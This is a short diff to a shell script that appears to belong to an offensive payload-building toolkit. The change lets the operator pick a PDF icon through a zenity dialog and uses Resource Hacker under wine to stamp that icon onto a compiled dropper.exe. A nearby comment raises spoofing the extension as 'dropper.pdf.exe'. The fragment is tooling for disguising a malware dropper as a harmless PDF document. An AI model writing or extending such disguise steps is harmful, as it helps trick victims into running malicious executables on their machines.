@@ -13491,7 +13491,8 @@ rm $IPATH/output/dropper.c > /dev/nul 2>&1
 
 ## Use resourceHacker (wine32) to change the dropper.exe icon
 echo "${BlueF}[☠]${white} Changing dropper.exe icon (RH)"${Reset};
-wine "$multiwine" -open "$IPATH/output/$Drop.exe" -save "$IPATH/output/$Drop.exe" -action addskip -res "$IPATH/bin/icons/AdobePDF.ico" -mask ICONGROUP,MAINICON,
+PDFI=$(zenity --title "☠ CHOSE PDF ICON TO USE ☠" --filename=$IPATH/bin/icons/PDFicons/ --file-selection --text "Chose one PDF icon to use") > /dev/null 2>&1
+wine "$multiwine" -open "$IPATH/output/$Drop.exe" -save "$IPATH/output/$Drop.exe" -action addskip -res "$PDFI" -mask ICONGROUP,MAINICON,
 
 
 ## Spoof dropper extension ? (dropper.pdf.exe OR dropper.exe ?)
